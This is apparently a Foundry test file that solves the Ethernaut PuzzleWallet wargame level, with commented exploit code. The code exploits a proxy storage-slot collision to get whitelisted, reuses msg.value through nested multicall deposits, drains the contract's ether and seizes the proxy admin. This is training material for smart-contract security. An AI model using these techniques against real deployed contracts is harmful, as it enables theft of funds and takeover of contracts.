// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {PuzzleWallet, PuzzleProxy} from "../../src/24/PuzzleWallet.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {PuzzleWalletFactory} from "src/24/PuzzleWalletFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract PuzzleWalletTest is Test, BaseTest {
    PuzzleWallet public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new PuzzleWalletFactory());
        vm.deal(player, 1 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 0.001 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = PuzzleWallet(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        // This level is simple but a little bit tricky.
        // First thing to know is that delegatecall always execute the call in the context of the calling contract. An important thing to note is that when a contract makes a delegatecall, the value of address(this), msg.sender, and msg.value do not change their values. This is because delegatecall forwards the entire message (including msg.sender and msg.value) to the target contract but executes the called contract’s code in the context of the calling contract.
        // More details : https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7

        // Now that we know this, we know that changing maxBalance variable would also change the value of the admin in the proxy

        // First we need to whitelist ourself to be able to run PuzzleWallet functions.
        // Changing pendingAdmin in the proxy would mean that the owner of PuzzleWallet has changed because they are in the same storage slot. After that we whitelist ourselves.
        PuzzleProxy(instance).proposeNewAdmin(player);
        instanceContract.addToWhitelist(player); // need to use PuzzleWallet(instance) so that the function implementation can be found in the contract

        // Now for the tricky part
        // The objective is to empty the contract so that we can run setMaxBalance
        // We know that the factory contract has deposited 0.001 ether and that the balance of the contract is not empty.
        // Solution : We need to find a way to call deposit tokens, increase our deposited balance WITHOUT  SENDING ether.
        // To do that we can use the multicall function. Multicall executes a delegate call so the context is unchanged. We know that delegate call preserves the msg.value. We can use this to call deposit multiple times. The second deposit call will increase our balance without sending ether since msg.value is preserved but the value was already sent with the previous call.
        bytes[] memory data = new bytes[](2);
        bytes[] memory multiCallData = new bytes[](1);
        data[0] = abi.encodeWithSelector(instanceContract.deposit.selector);

        // The check require(!depositCalled, "Deposit can only be called once"); does not allow us to send another deposit call for the same multicall
        // But we can bypass it by calling multicall again inside the first multicall and giving it the deposit function selector as data parameter. bool depositCalled = false; will be initiated again inside the second call and we will be able to call deposit inside the second call.
        multiCallData[0] = abi.encodeWithSelector(instanceContract.deposit.selector);
        data[1] = abi.encodeWithSelector(instanceContract.multicall.selector, multiCallData);
        // @note delegateCall preserves the original context, the second delegateCall will use the exact same msg.value of the origical call.
        instanceContract.multicall{value: 0.001 ether}(data);

        // Now our deposit balance is the same as the actual contract ether balance
        // Let's just empty the contract and call setMaxBalance with our address
        instanceContract.execute(player, instance.balance, "");
        instanceContract.setMaxBalance(uint256(uint160(player)));

        // DONE !

        vm.stopPrank();
    }
}
